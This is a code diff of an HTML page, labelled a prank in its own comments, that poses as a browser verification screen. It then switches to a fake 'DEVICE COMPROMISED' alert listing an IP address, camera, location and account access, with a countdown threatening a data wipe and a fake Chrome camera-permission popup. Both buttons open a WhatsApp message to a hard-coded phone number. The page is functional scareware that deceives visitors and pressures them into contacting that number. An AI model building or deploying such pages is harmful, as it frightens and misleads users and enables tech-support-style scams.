@@ -2,98 +2,229 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Device Compromised</title>
+  <title>Verifying...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #111;
+      color: #fff;
+      overflow: hidden;
+    }
+
+    .verify-container, .hacked-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .verify-container {
+      background-color: #f6f6f6;
+      color: #000;
+    }
+
+    .spinner {
+      border: 6px solid #ccc;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .hacked-container {
+      display: none;
       background-color: black;
       color: white;
-      font-family: 'Segoe UI', sans-serif;
-      text-align: center;
-      padding: 40px;
     }
-    h1 {
-      color: red;
-      font-size: 36px;
-    }
-    p {
-      font-size: 18px;
-    }
-    #countdown {
-      font-size: 28px;
+
+    .flashing {
+      background-color: red;
       color: yellow;
+      padding: 15px;
+      width: 100%;
+      text-align: center;
+      animation: flash 1s infinite;
+      font-weight: bold;
+      font-size: 1.2rem;
     }
+
+    @keyframes flash {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.2; }
+    }
+
+    .content {
+      max-width: 600px;
+      padding: 20px;
+    }
+
+    .info-block {
+      margin: 10px 0;
+    }
+
     .btn {
       padding: 14px 24px;
-      font-size: 18px;
+      font-size: 1rem;
       border: none;
       border-radius: 6px;
       text-decoration: none;
       margin: 10px;
       display: inline-block;
+      cursor: pointer;
     }
+
     .report {
       background-color: green;
       color: white;
     }
+
     .close {
       background-color: gray;
       color: white;
     }
 
-    @keyframes shake {
-      0% { transform: translate(0px, 0px); }
-      10% { transform: translate(-2px, 2px); }
-      20% { transform: translate(-2px, -2px); }
-      30% { transform: translate(2px, 2px); }
-      40% { transform: translate(2px, -2px); }
-      50% { transform: translate(-2px, 2px); }
-      60% { transform: translate(-2px, -2px); }
-      70% { transform: translate(2px, 2px); }
-      80% { transform: translate(2px, -2px); }
-      90% { transform: translate(-2px, 2px); }
-      100% { transform: translate(0px, 0px); }
+    #countdown {
+      font-size: 28px;
+      color: red;
     }
 
     .shake {
-      animation: shake 0.2s infinite;
+      animation: shake 0.3s infinite;
+    }
+
+    @keyframes shake {
+      0% { transform: translate(1px, 1px); }
+      25% { transform: translate(-1px, -2px); }
+      50% { transform: translate(-3px, 0px); }
+      75% { transform: translate(2px, 2px); }
+      100% { transform: translate(1px, -1px); }
+    }
+
+    /* Fake Webcam Popup */
+    #webcamPopup {
+      display: none;
+      position: fixed;
+      top: 25%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      color: #000;
+      padding: 20px;
+      width: 80%;
+      max-width: 300px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(255,0,0,0.4);
+      z-index: 9999;
+    }
+
+    #webcamPopup h3 {
+      margin: 0 0 10px;
+    }
+
+    #webcamPopup button {
+      background-color: red;
+      color: white;
+      padding: 8px 16px;
+      border: none;
+      border-radius: 5px;
+    }
+
+    @media (min-width: 768px) {
+      .btn {
+        font-size: 1.2rem;
+      }
+      .flashing {
+        font-size: 1.5rem;
+      }
     }
   </style>
 </head>
 <body>
-  <div id="main">
-    <h1>⚠️ DEVICE COMPROMISED</h1>
-    <p><strong>IP Address:</strong> 182.69.220.41</p>
-    <p><strong>Name:</strong> Verified via Google Account</p>
-    <p><strong>Front Camera:</strong> Accessed ✅</p>
-    <p><strong>Live Location:</strong> Locked 🔒</p>
-    <p style="color: red; font-weight: bold;">
-      You have <span id="countdown">10</span> seconds to report your identity or risk total data loss.
-    </p>
 
-    <a class="btn report" href="https://wa.me/91123455789?text=Help!%20My%20phone%20says%20it's%20been%20hacked%20and%20I%20have%20only%2010%20seconds%20to%20report%20my%20identity.%20Please%20help!!">
-      Report Identity
-    </a>
+  <!-- Fake Verification Screen -->
+  <div class="verify-container" id="verifyScreen">
+    <h2>Checking your browser before accessing...</h2>
+    <div class="spinner"></div>
+    <p>This process is automatic. Your browser will redirect shortly.</p>
+    <p>Please allow up to 5 seconds…</p>
+  </div>
 
-    <a class="btn close" href="https://wa.me/91123455789?text=Help!%20My%20phone%20says%20it's%20been%20hacked%20and%20I%20have%20only%2010%20seconds%20to%20report%20my%20identity.%20Please%20help!!">
-      Close
-    </a>
+  <!-- Hacked Prank Screen -->
+  <div class="hacked-container" id="hackedScreen">
+    <div class="flashing">⚠️ SECURITY BREACH DETECTED ⚠️</div>
+    <div class="content" id="main">
+      <h1 style="color: red;">DEVICE COMPROMISED</h1>
+      <div class="info-block">📍 Location: Access Granted</div>
+      <div class="info-block">📸 Front Camera: Ready</div>
+      <div class="info-block">🌐 IP Address: 182.69.220.41</div>
+      <div class="info-block">🔒 Google Account: Access Verified</div>
+      <p style="margin-top: 20px;">You have <span id="countdown">10</span> seconds to verify identity or risk data wipe!</p>
+      <a class="btn report" href="https://wa.me/91123455789?text=My%20device%20says%20it's%20been%20hacked%20and%20countdown%20started!">
+        Report Identity
+      </a>
+      <a class="btn close" href="https://wa.me/91123455789?text=I%20clicked%20a%20link%20and%20now%20it%20says%20my%20phone%20is%20hacked!!">
+        Close
+      </a>
+    </div>
+  </div>
+
+  <!-- Fake Webcam Popup -->
+  <div id="webcamPopup">
+    <h3>Chrome requires camera access</h3>
+    <p>Continue to verify you're human</p>
+    <button onclick="hidePopup()">Deny</button>
   </div>
 
   <script>
-    let seconds = 10;
+    const verify = document.getElementById("verifyScreen");
+    const hacked = document.getElementById("hackedScreen");
+    const main = document.getElementById("main");
     const timer = document.getElementById("countdown");
-    const mainDiv = document.getElementById("main");
 
-    const interval = setInterval(() => {
-      seconds--;
-      timer.textContent = seconds;
-      if (seconds <= 0) {
-        clearInterval(interval);
-        timer.textContent = "0";
-        mainDiv.classList.add("shake");
-        alert("System instability detected. Please report now!");
-      }
-    }, 1000);
+    setTimeout(() => {
+      verify.style.display = "none";
+      hacked.style.display = "flex";
+      startCountdown();
+    }, 5000);
+
+    function startCountdown() {
+      let timeLeft = 10;
+      const interval = setInterval(() => {
+        timeLeft--;
+        timer.textContent = timeLeft;
+        if (timeLeft <= 0) {
+          clearInterval(interval);
+          timer.textContent = "0";
+          main.classList.add("shake");
+          alert("⚠️ DATA WIPE INITIATED ⚠️");
+          
+        }
+      }, 1000);
+
+      setTimeout(showFakeWebcamAccess, 3000);
+    }
+
+    function showFakeWebcamAccess() {
+      document.getElementById("webcamPopup").style.display = "block";
+    }
+
+    function hidePopup() {
+      document.getElementById("webcamPopup").style.display = "none";
+    }
   </script>
+
 </body>
 </html>
